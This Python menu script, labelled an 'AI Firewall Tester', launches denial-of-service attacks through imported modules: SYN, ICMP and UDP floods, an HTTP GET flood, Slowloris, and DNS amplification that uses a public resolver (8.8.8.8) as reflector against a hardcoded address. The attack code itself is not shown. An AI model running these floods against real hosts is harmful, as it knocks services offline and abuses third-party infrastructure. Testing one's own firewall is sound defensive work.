import os
from firewall.sniffer import start_sniffing
from attacks.network_layer.syn_flood import launch_syn_flood
from attacks.network_layer.icmp_flood import icmp_flood
from attacks.network_layer.udp_flood import udp_flood
from attacks.web_layer.http_get_flood import flood_http
from attacks.web_layer.slowloris import slowloris_attack
from attacks.network_layer.dns_amplification import dns_amplification 

def menu():
	print("\n=== AI Firewall Tester ===")
	print("1.Start packet sniffing")
	print("2.Launch SYN  Flood Attack")
	print("3.Launch ICMP Flood Attack")
	print("4.Launch UDP Flood Attack")
	print("5.Launch HTTP GET Flood Attack")
	print("6.Launch Slowloris Attack")
	print("7.Launch DNS Amplification Attack")
	print("8.Exit")

if __name__=="__main__":
	while True:
		menu()
		choice = input("Enter your choice:")

		if choice == '1':
			iface = input("Enter interface:")
			start_sniffing(interface=iface)

		elif choice =='2':
			target_ip = input("Enter target IP:")
			target_port = int(input("Enter target port:"))
			iface = input("Enter Interface:")
			launch_syn_flood(target_ip,target_port,iface)

		elif choice == '3':
			target_ip = input("Enter target IP:")
			count = int(input("Enter number of ICMP packets to send:"))
			icmp_flood(target_ip,count)

		elif choice == '4':
			target_ip = input("Enter target IP:")
			count = int(input("Enter number of UDP packets to send:"))
			target_port = int(input("Enter target port:"))
			udp_flood(target_ip,target_port,count)

		elif choice == '5':
			count = int(input("Enter number of HTTP GET Requests to send:"))
			flood_http("http://testphp.vulnweb.com",count)

		elif choice == '6':
			count = int(input("Enter number of sockets to create:"))
			slowloris_attack("192.168.0.105",80,count)
		
		elif choice == '7':
			dns_amplification("192.168.0.105",dns_server="8.8.8.8",count=50)

		elif choice == '8':
		 	print("Exiting....")
		 	break

		else:
		 	print("Invalid choice. Try again")
